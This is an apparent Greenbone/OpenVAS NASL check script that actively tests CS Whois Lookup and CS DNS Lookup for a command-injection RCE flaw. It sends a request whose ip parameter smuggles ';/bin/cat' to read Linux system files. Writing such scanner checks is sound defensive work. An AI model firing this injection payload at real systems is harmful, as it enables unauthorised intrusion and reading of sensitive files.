# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100166");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-04-26 20:59:36 +0200 (Sun, 26 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("CS Whois Lookup RCE Vulnerability (Apr 2009) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"CS Whois Lookup and CS DNS Lookup are prone to a remote
  command execution (RCE) vulnerability because the software fails to adequately sanitize
  user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful attacks can compromise the affected software and
  possibly the computer.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34700");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files("linux");

foreach dir (make_list_unique("/whois", "/cs-whois", "/cs-dns", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/index.php");
  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  foreach pattern (keys(files)) {
    file = files[pattern];

    url = dir + "/index.php?ip=;/bin/cat%20/" + file;

    if (http_vuln_check(port: port, url: url, pattern: pattern))
      report += http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n';
  }
}

if (report) {
  report = 'The following URLs are affected:\n\n' + chomp(report);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
